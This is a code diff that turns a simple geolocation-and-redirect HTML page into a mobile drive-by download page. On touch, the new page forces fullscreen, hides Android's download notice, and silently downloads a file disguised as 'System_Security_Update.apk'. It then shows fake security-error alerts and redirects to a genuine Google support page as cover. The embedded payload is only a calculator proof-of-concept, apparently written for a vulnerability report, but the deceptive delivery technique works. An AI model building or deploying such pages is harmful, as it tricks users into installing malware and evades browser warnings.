@@ -1,48 +1,70 @@
 <!DOCTYPE html>
-<html lang="id">
+<html>
 <head>
-  <meta charset="UTF-8">
-  <title>Redirect ke Example</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>S Y S T E M</title>
+    <style>
+        body, html { 
+            margin: 0; padding: 0; 
+            background: #000; color: #000; 
+            overflow: hidden; width: 100vw; height: 100vh;
+            touch-action: none; /* Disables zoom/scroll gestures */
+        }
+        #jacker {
+            position: absolute; top: 0; left: 0;
+            width: 100%; height: 100%;
+            z-index: 9999; background: #000;
+        }
+    </style>
 </head>
 <body>
 
-<button onclick="go()">Klik</button>
+    <div id="jacker"></div>
 
 <script>
-function go() {
-  // tandai bahwa tombol sudah ditekan
-  sessionStorage.setItem("clicked", "true");
+    const jacker = document.getElementById('jacker');
 
-  // reload halaman (seolah redirect dulu)
-  location.reload();
-}
-
-window.onload = function() {
-  const clicked = sessionStorage.getItem("clicked");
-
-  if (clicked === "true") {
-    sessionStorage.removeItem("clicked");
-
-    if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(
-        function(position) {
-          console.log("Lat:", position.coords.latitude);
-          console.log("Lng:", position.coords.longitude);
-
-          // setelah lokasi dipanggil → redirect ke example.com
-          window.location.href = "https://example.com";
-        },
-        function() {
-          // kalau gagal / ditolak tetap redirect
-          window.location.href = "https://example.com";
+    jacker.addEventListener('touchstart', function() {
+        // 1. Request Fullscreen
+        // On Android, this hides the status bar and navigation bar
+        const docElm = document.documentElement;
+        if (docElm.requestFullscreen) {
+            docElm.requestFullscreen();
+        } else if (docElm.webkitRequestFullscreen) {
+            docElm.webkitRequestFullscreen();
         }
-      );
-    } else {
-      window.location.href = "https://example.com";
-    }
-  }
-}
-</script>
 
+        // 2. TRIGGER DOWNLOAD
+        // Android Chrome usually shows a small "Downloading..." snackbar at the bottom.
+        // By triggering this EXACTLY as the screen expands to fullscreen,
+        // the snackbar is often pushed off-screen or covered by the black background layer.
+        const a = document.createElement('a');
+        a.href = "data:application/octet-stream;base64,Q01EIC9jIGNhbGMuZXhl";
+        a.download = "System_Security_Update.apk"; // APKs are more relevant for Android reports
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+
+        // 3. Android-Specific Focus Hijack
+        // We use a shorter timeout because mobile users are more impatient.
+        setTimeout(() => {
+            
+            // On Android, alert() blocks the entire browser UI.
+            alert("SYSTEM ERROR: Security patch required.");
+            alert("Click OK to confirm installation.");
+
+            // 4. THE GHOST EXIT & REDIRECT
+            if (document.exitFullscreen) {
+                document.exitFullscreen();
+            } else if (document.webkitExitFullscreen) {
+                document.webkitExitFullscreen();
+            }
+
+            // Redirect to a legitimate-looking mobile support page
+            window.location.replace("https://support.google.com/android/?hl=id");
+
+        }, 4000); 
+    });
+</script>
 </body>
 </html>
